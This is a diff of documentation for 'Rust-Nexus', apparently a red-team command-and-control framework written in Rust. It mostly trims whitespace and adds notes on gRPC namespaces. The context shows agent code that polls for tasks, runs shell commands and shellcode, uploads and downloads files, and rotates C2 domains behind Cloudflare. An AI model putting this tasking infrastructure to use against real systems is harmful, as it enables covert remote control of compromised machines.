@@ -12,15 +12,15 @@ service NexusC2 {
   rpc RegisterAgent(RegistrationRequest) returns (RegistrationResponse);
   rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse);
   rpc GetAgentInfo(AgentInfoRequest) returns (AgentInfoResponse);
-  
+
   // Task management with streaming
   rpc GetTasks(TaskRequest) returns (stream Task);
   rpc SubmitTaskResult(TaskResult) returns (TaskResultResponse);
-  
+
   // File operations with chunked streaming
   rpc UploadFile(stream FileChunk) returns (FileUploadResponse);
   rpc DownloadFile(FileDownloadRequest) returns (stream FileChunk);
-  
+
   // Advanced execution capabilities
   rpc ExecuteShellcode(ShellcodeRequest) returns (ShellcodeResponse);
   rpc ExecuteBOF(BOFRequest) returns (BOFResponse);
@@ -175,7 +175,7 @@ let task_request = TaskRequest {
 let tasks = grpc_client.get_tasks(task_request).await?;
 for task in tasks {
     println!("Received task: {} ({})", task.task_id, task.command);
-    
+
     // Execute task based on type
     let result = match task.task_type() {
         TaskType::ShellCommand => execute_shell_command(&task).await?,
@@ -183,7 +183,7 @@ for task in tasks {
         TaskType::FiberShellcode => execute_fiber_task(&task).await?,
         _ => execute_generic_task(&task).await?,
     };
-    
+
     // Submit result back to server
     submit_task_result(task.task_id, result).await?;
 }
@@ -466,17 +466,72 @@ if let Some(config_update) = heartbeat_response.config_update {
     if !config_update.c2_domains.is_empty() {
         agent.update_domains(&config_update.c2_domains).await?;
     }
-    
+
     // Update heartbeat interval
     if config_update.heartbeat_interval > 0 {
         agent.set_heartbeat_interval(config_update.heartbeat_interval);
     }
-    
+
     // Update certificates
     if let Some(cert_update) = config_update.certificate_update {
         agent.update_certificates(cert_update).await?;
     }
 }
+```
+
+## Implementation Notes
+
+### gRPC Namespace Structure
+
+The Rust-Nexus gRPC implementation uses tonic-generated code from the `nexus.v1` protobuf package. All generated types are accessible through the `proto` module:
+
+**Important**: When working with the protobuf-generated code, use explicit imports to avoid namespace issues:
+
+```rust
+// Correct: Use explicit imports from the proto module
+use crate::proto::{
+    nexus_c2_server, nexus_c2_client,
+    RegistrationRequest, RegistrationResponse,
+    HeartbeatRequest, HeartbeatResponse,
+    TaskRequest, Task, TaskResult, TaskResultResponse,
+    // ... other message types
+};
+
+// Then use directly without proto:: prefix
+let client = nexus_c2_client::NexusC2Client::new(channel);
+let server = nexus_c2_server::NexusC2Server::new(service);
+```
+
+**Common Issues**: If you encounter compilation errors like `failed to resolve: use of unresolved module or unlinked crate 'proto'`, ensure:
+
+1. You have the correct import statements
+2. The tonic build process has completed successfully
+3. Your namespace references match the structure defined in `lib.rs`
+
+**Reference**: For complete namespace troubleshooting, see [gRPC Namespace Fix Guide](../troubleshooting/GRPC_NAMESPACE_FIX.md).
+
+### Service Implementation Pattern
+
+When implementing the gRPC service trait, use the correct namespace structure:
+
+```rust
+// Server implementation
+#[tonic::async_trait]
+impl nexus_c2_server::NexusC2 for NexusC2Service {
+    async fn register_agent(
+        &self,
+        request: Request<RegistrationRequest>,
+    ) -> Result<Response<RegistrationResponse>, Status> {
+        // Implementation here
+    }
+    // ... other methods
+}
+
+// Service registration
+let service = NexusC2Service::new(/* dependencies */);
+let server = Server::builder()
+    .add_service(nexus_c2_server::NexusC2Server::new(service))
+    .serve(addr);
 ```
 
 ## Client Implementation
@@ -492,35 +547,35 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Setup certificate manager
     let cert_config = OriginCertConfig::default();
     let cert_manager = Arc::new(CertManager::new(cert_config)?);
-    
+
     // Setup domain manager
     let domain_config = DomainConfig::default();
     let cf_manager = CloudflareManager::new(CloudflareConfig::default())?;
     let domain_manager = Arc::new(DomainManager::new(domain_config, cf_manager).await?);
-    
+
     // Create gRPC client
     let client_config = GrpcClientConfig::default();
     let mut grpc_client = GrpcClient::new(client_config, cert_manager, domain_manager);
-    
+
     // Connect to server
     grpc_client.connect().await?;
-    
+
     // Agent main loop
     loop {
         // Send heartbeat
         let heartbeat_response = grpc_client.heartbeat(create_heartbeat_request()).await?;
-        
+
         // Get and execute tasks
         let tasks = grpc_client.get_tasks(TaskRequest {
             agent_id: agent_id.clone(),
             max_tasks: 10,
         }).await?;
-        
+
         for task in tasks {
             let result = execute_task(task).await?;
             grpc_client.submit_task_result(result).await?;
         }
-        
+
         // Sleep before next cycle
         tokio::time::sleep(Duration::from_secs(30)).await;
     }
@@ -538,21 +593,21 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Setup certificate manager
     let cert_config = OriginCertConfig::default();
     let cert_manager = Arc::new(CertManager::new(cert_config)?);
-    
+
     // Create and start gRPC server
     let server_config = GrpcServerConfig::default();
     let server = GrpcServer::new(server_config, cert_manager);
-    
+
     // Start server
     server.start().await?;
-    
+
     println!("gRPC C2 server started on port 443");
-    
+
     // Keep server running
     tokio::signal::ctrl_c().await?;
     println!("Shutting down server...");
     server.stop().await?;
-    
+
     Ok(())
 }
 ```
@@ -567,7 +622,7 @@ let tls_config = ClientTlsConfig::new()
     .ca_certificate(Certificate::from_pem(ca_cert_pem))
     .identity(Identity::from_pem(client_cert_pem, client_key_pem));
 
-// Server-side certificate configuration  
+// Server-side certificate configuration
 let tls_config = ServerTlsConfig::new()
     .identity(Identity::from_pem(server_cert_pem, server_key_pem))
     .client_ca_root(ca_cert_pem);
@@ -603,10 +658,10 @@ env_logger::init();
 // Monitor connection health
 tokio::spawn(async move {
     let mut interval = tokio::time::interval(Duration::from_secs(30));
-    
+
     loop {
         interval.tick().await;
-        
+
         if !grpc_client.health_check().await? {
             warn!("gRPC connection unhealthy, attempting rotation");
             grpc_client.rotate_endpoint().await?;
@@ -655,7 +710,7 @@ while let Some(chunk) = stream.message().await? {
 - Monitor connection health continuously
 - Implement graceful degradation for connectivity issues
 
-### **Error Handling**  
+### **Error Handling**
 - Handle all gRPC status codes appropriately
 - Implement exponential backoff for retries
 - Log errors for debugging and monitoring
